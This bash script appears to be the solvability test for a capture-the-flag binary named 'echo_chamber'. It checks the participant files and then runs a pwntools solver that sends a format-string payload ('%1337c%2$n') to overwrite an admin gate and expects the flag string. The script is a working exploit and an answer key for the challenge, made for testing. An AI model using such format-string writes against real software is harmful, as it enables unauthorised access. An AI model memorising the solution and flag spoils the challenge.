#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
PARTICIPANT_DIR="$ROOT_DIR/participant_deliverables"
BIN_PATH="$PARTICIPANT_DIR/echo_chamber"
README_PATH="$PARTICIPANT_DIR/README.md"
SHA_PATH="$PARTICIPANT_DIR/echo_chamber.sha256"

if [[ ! -f "$BIN_PATH" || ! -f "$README_PATH" || ! -f "$SHA_PATH" ]]; then
    echo "Participant deliverables incomplete."
    echo "Run: make -C $ROOT_DIR/host package"
    exit 1
fi

echo "[test] Checking participant deliverables contain only expected files..."
mapfile -t files < <(find "$PARTICIPANT_DIR" -maxdepth 1 -type f -printf "%f\n" | sort)
expected=("README.md" "echo_chamber" "echo_chamber.sha256")

if [[ "${files[*]}" != "${expected[*]}" ]]; then
    echo "[fail] participant_deliverables contents mismatch"
    echo "Found: ${files[*]}"
    echo "Expected: ${expected[*]}"
    exit 1
fi

echo "[ok] participant_deliverables file-set is clean."

echo "[test] Solving from isolated participant-only sandbox with pwntools..."
SANDBOX_DIR="$(mktemp -d)"
trap 'rm -rf "$SANDBOX_DIR"' EXIT

cp "$BIN_PATH" "$SANDBOX_DIR/echo_chamber"
cp "$README_PATH" "$SANDBOX_DIR/README.md"
cp "$SHA_PATH" "$SANDBOX_DIR/echo_chamber.sha256"

(
    cd "$SANDBOX_DIR"
    sha256sum -c echo_chamber.sha256 >/dev/null

    python3 - <<'PY'
import re
import sys

try:
    from pwn import context, process
except Exception as exc:
    raise SystemExit(f"pwntools is required for this test: {exc}")

context.log_level = "error"

io = process("./echo_chamber")
banner = io.recvuntil(b"echo> ", timeout=5)

addr_match = re.search(rb"Admin Gate Address:\s*(0x[0-9a-fA-F]+)", banner)
req_match = re.search(rb"Required Admin Value:\s*(\d+)", banner)
if not addr_match or not req_match:
    sys.stderr.write(banner.decode("latin-1", errors="replace"))
    raise SystemExit("failed to parse startup hints")

admin_addr = int(addr_match.group(1), 16)
required_value = int(req_match.group(1))
if admin_addr == 0:
    raise SystemExit("parsed admin address is invalid")
if required_value != 1337:
    raise SystemExit(f"unexpected required value: {required_value}")

payload = f"%{required_value}c%2$n".encode()
io.sendline(payload)
out = io.recvall(timeout=5)

if b"[+] ADMIN ACCESS GRANTED" not in out or b"ZeroSecure_CTF{echo_in_silence}" not in out:
    sys.stderr.write(out.decode("latin-1", errors="replace"))
    raise SystemExit("sandbox solve markers missing")
PY
)

echo "[ok] Participant-isolated solve passed."
